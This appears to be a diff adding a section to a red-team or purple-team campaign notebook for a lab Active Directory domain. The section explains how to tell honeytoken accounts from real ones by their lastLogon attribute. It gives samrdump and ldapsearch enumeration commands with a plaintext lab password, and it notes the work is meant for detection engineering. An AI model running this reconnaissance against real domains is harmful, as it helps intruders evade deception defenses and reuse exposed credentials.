+<h3>Phase 0 Step 6 — Honeypot Detection via lastLogon ⏳</h3>
+<p><strong>Status:</strong> Not yet tested. Requires credentials.</p>
+<h4>Why it works</h4>
+<p>Honeytoken accounts are designed to detect interaction but are never authenticated. The <code>lastLogon</code> attribute exposes them:<br />
+- <code>lastLogon = 0</code> (or 12/31/1600) = never authenticated = honeypot<br />
+- Real privileged accounts always have authentication history<br />
+- Machine accounts with <code>lastLogon = 0</code> are impossible (domain join requires auth)</p>
+<h4>Attack command (planned)</h4>
+<pre><code class="language-bash"># Via SAMR (less monitored)
+python3 samrdump.py cadre.local/intern_blue:'1nt3rn_Blu3!'@192.168.77.10 | grep &quot;Last Logon: 0&quot;
+
+# Via LDAP (noisier)
+ldapsearch -x -H ldap://dc01.cadre.local -D &quot;intern_blue@cadre.local&quot; -w '1nt3rn_Blu3!' \
+  -b &quot;DC=cadre,DC=local&quot; &quot;(&amp;(lastLogon=0)(!(objectClass=computer)))&quot; sAMAccountName
+</code></pre>
+<h4>What to expect (success)</h4>
+<ul>
+<li>List of users with lastLogon=0</li>
+<li>These are either honeypots OR new accounts that have never logged in</li>
+<li>Cross-reference with <code>logonCount=0</code> to filter true honeypots</li>
+</ul>
+<h4>CADRE-specific notes</h4>
+<ul>
+<li>Defer until after Phase 1</li>
+<li>Useful for purple-team detection engineering</li>
+</ul>
+<hr />
+<hr />
+<h2>Mechanics &amp; deep reference (separate file)</h2>
+<p>Command-level steps, NetExec modules, ADeleg workflow, telemetry fingerprints, and study references are in <strong><a href="CAMPAIGNS-METADATA-mechanics.md">CAMPAIGNS-METADATA-mechanics.md</a></strong> (~4.4k lines). Use that file when you need full attack commands; keep this index open for per-attack lookup tables.</p></body></html>
